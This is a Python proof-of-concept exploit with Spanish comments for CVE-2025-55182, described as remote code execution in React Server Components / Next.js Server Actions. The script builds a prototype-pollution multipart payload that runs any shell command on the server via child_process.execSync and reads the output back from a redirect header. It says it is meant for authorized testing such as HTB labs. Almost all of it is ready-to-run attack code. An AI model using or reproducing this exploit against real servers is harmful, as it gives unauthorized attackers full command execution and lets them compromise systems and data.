#!/usr/bin/env python3
"""
PoC manual de CVE-2025-55182 (RCE en React Server Components / Server Actions
de Next.js), reproduciendo a mano la petición HTTP que usa la plantilla de
nuclei en:
    /home/amoen/.local/nuclei-templates/http/cves/2025/CVE-2025-55182.yaml

Solo usar contra objetivos que tengas autorización explícita para probar
(máquinas de HTB, laboratorios propios, engagements autorizados).

Uso:
    python3 cve_2025_55182_poc.py <url_base> "<comando>"

Ejemplo:
    python3 cve_2025_55182_poc.py http://10.129.126.61:3000 "id"
"""

import json
import sys

import requests


def build_payload(command):
    """Construye el body multipart tal cual lo hace la plantilla de nuclei,
    sustituyendo el comando ejecutado en el servidor."""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    # Comando de shell que se ejecuta en el servidor vía child_process.execSync
    prefix_js = (
        "var res=process.mainModule.require('child_process')"
        f".execSync({json.dumps(command)}).toString().trim();;"
        "throw Object.assign(new Error('NEXT_REDIRECT'),"
        "{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});"
    )

    part0 = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": prefix_js,
            "_chunks": "$Q2",
            "_formData": {"get": "$1:constructor:constructor"},
        },
    }

    body = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{json.dumps(part0)}\r\n"
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="1"\r\n\r\n'
        '"$@0"\r\n'
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="2"\r\n\r\n'
        "[]\r\n"
        f"--{boundary}--\r\n"
    ).encode()

    headers = {
        "Next-Action": "x",
        "Content-Type": f"multipart/form-data; boundary={boundary}",
    }
    return body, headers


def exploit(base_url, command, timeout=15):
    body, headers = build_payload(command)
    resp = requests.post(
        base_url.rstrip("/") + "/",
        headers=headers,
        data=body,
        allow_redirects=False,
        timeout=timeout,
    )
    return resp


def extract_result(resp):
    """El resultado del comando viaja dentro de una cabecera de redirect
    interna de Next.js, con forma: x-action-redirect: /login?a=<resultado>"""
    for name, value in resp.headers.items():
        if "redirect" in name.lower() and "a=" in value:
            marker = "a="
            idx = value.find(marker)
            if idx != -1:
                return value[idx + len(marker):]
    return None


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Uso: {sys.argv[0]} <url_base> \"<comando>\"")
        print(f'Ejemplo: {sys.argv[0]} http://10.129.126.61:3000 "id"')
        sys.exit(1)

    base_url, command = sys.argv[1], sys.argv[2]
    resp = exploit(base_url, command)

    print(f"Status HTTP: {resp.status_code}")
    print("Cabeceras relevantes:")
    for k, v in resp.headers.items():
        if any(t in k.lower() for t in ("redirect", "action", "location")):
            print(f"  {k}: {v}")

    result = extract_result(resp)
    print()
    if result:
        print(f"Salida del comando '{command}':")
        # El valor puede venir url-encoded por el navegador/servidor
        import urllib.parse
        print(f"  {urllib.parse.unquote(result)}")
    else:
        print("No se encontró la cabecera de redirect esperada. El objetivo "
              "puede no ser vulnerable, o la respuesta cambió de formato.")
